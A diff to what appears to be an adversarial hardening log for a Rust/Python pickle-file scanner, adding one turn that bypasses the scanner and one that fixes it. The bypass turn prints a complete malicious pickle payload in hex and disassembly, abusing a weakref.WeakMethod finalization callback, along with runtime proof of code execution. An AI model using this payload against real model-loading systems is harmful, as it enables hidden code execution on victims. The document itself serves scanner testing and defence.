@@ -20437,3 +20437,162 @@ format unchanged; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3897 passed, 1022 skipped, 21 warnings in 39.63s
 ```
+
+## Turn 295 - Bypass via `weakref.WeakMethod` finalization callback
+
+Offensive turn after the Turn 294 `weakref.ref/proxy` block. The same callback
+family still has another source-level constructor: `weakref.WeakMethod`.
+
+Representative payload:
+
+```python
+bound = collections.UserList.append.__get__(collections.UserList(), collections.UserList)
+weakref.WeakMethod(bound, builtins.help)
+```
+
+`WeakMethod` stores a callback tied to the bound method's instance. The payload
+creates the bound method with the clean descriptor
+`collections.UserList.append.__get__`; the temporary `UserList()` instance only
+lives in reducer arguments. After `WeakMethod(...)` returns, the bound method
+and instance are released, so CPython invokes `builtins.help(weakmethod_ref)`.
+
+Proof:
+
+```text
+payload_len 137
+payload_hex 80048c077765616b7265668c0a5765616b4d6574686f6493288c0b636f6c6c656374696f6e738c17557365724c6973742e617070656e642e5f5f6765745f5f93288c0b636f6c6c656374696f6e738c08557365724c6973749329528c0b636f6c6c656374696f6e738c08557365724c6973749374528c086275696c74696e738c0468656c709374522e
+
+0: PROTO 4
+23: STACK_GLOBAL       # weakref.WeakMethod
+63: STACK_GLOBAL       # collections.UserList.append.__get__
+88: STACK_GLOBAL       # collections.UserList
+90: REDUCE             # UserList()
+114: STACK_GLOBAL      # collections.UserList
+116: REDUCE            # UserList.append.__get__(instance, UserList)
+133: STACK_GLOBAL      # builtins.help callback
+134: TUPLE             # (bound_method, help)
+135: REDUCE            # WeakMethod(...), then instance dies and invokes help(ref)
+136: STOP
+```
+
+Scanner proof:
+
+```text
+verdict clean findings 0 errors ()
+imports [
+  ('weakref', 'WeakMethod', False),
+  ('collections', 'UserList.append.__get__', False),
+  ('collections', 'UserList', False),
+  ('collections', 'UserList', False),
+  ('builtins', 'help', False),
+]
+invocations [
+  ('collections', 'UserList', 0),
+  ('collections', 'UserList.append.__get__', 2),
+  ('weakref', 'WeakMethod', 2),
+]
+findings []
+```
+
+Runtime proof with shadowed `pydoc`:
+
+```text
+runtime_rc 0
+runtime_type WeakMethod
+runtime_alive None
+marker_exists True
+marker_text owned-by-weakmethod-rce
+```
+
+Retained-instance boundary:
+
+```text
+obj = collections.UserList()
+bound = collections.UserList.append.__get__(obj, collections.UserList)
+wm = weakref.WeakMethod(bound, builtins.help)
+(obj, wm)
+
+scan clean findings 0
+runtime_type tuple
+tuple_types ['UserList', 'WeakMethod']
+weakmethod_alive True
+bound_self_same True
+marker_exists False
+```
+
+Why it bypasses:
+
+- Turn 294 added rows for `weakref.ref` and `weakref.proxy`, but not
+  `weakref.WeakMethod`.
+- `WeakMethod` callback dispatch is again driven by weakref finalization, not a
+  visible Python call edge.
+- The bound method is manufactured via a clean descriptor import; the scanner
+  records the descriptor and constructor calls but does not associate the
+  second `WeakMethod` argument with a one-argument callback invocation.
+
+Likely source-level defense:
+
+- Add an exact two-argument callback-dispatch row for
+  `weakref.WeakMethod(method, callback)` with one callback positional argument.
+- This can reuse the `CallbackDispatchGuard::Always` added in Turn 294 and
+  keeps the fix close to the finite weakref callback source.
+- The one-argument `weakref.WeakMethod(method)` form should remain clean.
+
+Performance note:
+
+- The representative payload is 137 bytes.
+- Warm scan timing over 1000 scans was median `0.000079s`, p95 `0.000088s`,
+  and max `0.000586s`.
+
+## Turn 296 - Block `weakref.WeakMethod` callback dispatch
+
+Defensive turn for Turn 295. The fix stays at the finite weakref callback
+source instead of adding a package-specific block for the descriptor used to
+create the bound method.
+
+Implementation:
+
+- Added an exact two-argument callback-dispatch row for
+  `weakref.WeakMethod(method, callback)`.
+- Reused the existing `CallbackDispatchGuard::Always` and synthesized a
+  one-positional-argument invocation for the callback.
+- Kept the one-argument `weakref.WeakMethod(method)` form clean.
+
+Regression coverage:
+
+```text
+bound = collections.UserList.append.__get__(collections.UserList(), collections.UserList)
+weakref.WeakMethod(bound, builtins.help)
+```
+
+The scanner now records `builtins.help` with one positional argument, so the
+existing Python call-graph pass flags
+`_sitebuiltins._Helper.__call__ -> builtins.__import__`.
+
+The negative coverage builds the same temporary bound method without a callback
+and asserts the scan remains clean.
+
+Validation:
+
+```text
+cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml
+ok
+
+RUSTFLAGS="-C link-arg=-undefined -C link-arg=dynamic_lookup" cargo build --manifest-path packages/modelaudit-picklescan/Cargo.toml --release --features extension-module,abi3
+finished release build
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q -k "weakmethod"
+2 passed, 182 deselected
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+184 passed
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+222 passed
+
+ruff format/check, mypy
+format unchanged; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3899 passed, 1022 skipped, 21 warnings in 42.72s
+```
